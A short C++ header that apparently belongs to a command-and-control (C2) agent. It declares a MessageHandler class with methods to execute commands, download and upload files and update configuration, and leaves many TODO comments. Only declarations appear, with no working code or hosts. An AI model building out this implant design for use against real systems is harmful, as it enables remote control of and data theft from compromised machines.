/* MessageHandler.h */
/*  (OWNS execution components) */

#ifndef MESSAGE_HANDLER_H
#define MESSAGE_HANDLER_H

#include "C2Profile.h"
#include "MessageTypes.h"

#include <string>
#include <vector>
#include <cstdint>




class MessageHandler
{
public:
	//MessageHandler(C2Profile& config) {}; // TODO:
	//MessageHandler();
    
    bool sendMessage(); // overload this function?
    bool recvMessage(); // overload this function?

	bool processMessage(InternalMessage* msg);
	//bool receiveMessages(uint8_t* buffer, size_t bytes_received);

	bool executeCommand(std::vector<uint8_t>& data);

	bool downloadFile(std::vector<uint8_t>& data);
	//bool executeFile();
	bool uploadFile(std::vector<uint8_t>& data);
	bool updateConfig(std::vector<uint8_t>& data);
	bool handleServerError(std::vector<uint8_t>& data);


	//bool handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg);
private:
	std::vector<uint8_t> string2byte(std::string& inMsg);
	std::string byte2string(std::vector<uint8_t>& inMsg);

	//C2Profile& config_;
	// Connections connection_ // MessageHandler should own/control socket/connections?

	//std::queue<InternalMessage> outgoing_queue;
	//std::mutex queue_mutex; // TODO: add thread logic too?


};


typedef std::unique_ptr<MessageHandler> MessageHandlerPtr;

#endif
